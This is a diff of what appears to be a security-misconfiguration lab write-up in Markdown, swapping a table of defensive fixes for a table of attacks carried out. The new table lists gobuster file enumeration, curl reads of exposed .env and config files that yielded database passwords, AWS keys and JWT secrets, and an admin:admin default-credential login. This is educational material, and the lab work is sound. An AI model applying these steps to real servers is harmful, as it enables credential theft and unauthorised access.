-| Missing security headers | XSS, clickjacking, MITM | Add all 7 headers in web server config |
-| Exposed sensitive files | Credential theft | Nginx deny rules + git .gitignore |
-| Database internet-facing | Direct DB attack | `bind-address=127.0.0.1` |
-| Public cloud storage | Mass data breach | Block Public Access at account level |
+| Attack | Tool | Result |
+|--------|------|--------|
+| File enumeration | gobuster | Found `.env`, `backup.sql`, `config.php`, `phpinfo.php` |
+| Env file read | curl | DB password, AWS key, JWT secret |
+| Debug info | curl | All server env vars + hardcoded secrets |
+| Verbose errors | curl | DB schema, file paths, stack trace |
+| Default creds | curl | `admin:admin` → admin panel + DB connection string |
+| Header audit | curl + python3 | 6/6 security headers missing |
 
 ## Further Reading
-- [OWASP A05:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
-- [securityheaders.com](https://securityheaders.com) — Header scanner
-- [Mozilla Observatory](https://observatory.mozilla.org) — Web security scanner
-- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/) — Hardening guides
+- [OWASP A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
+- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
+- [PortSwigger Information Disclosure](https://portswigger.net/web-security/information-disclosure)
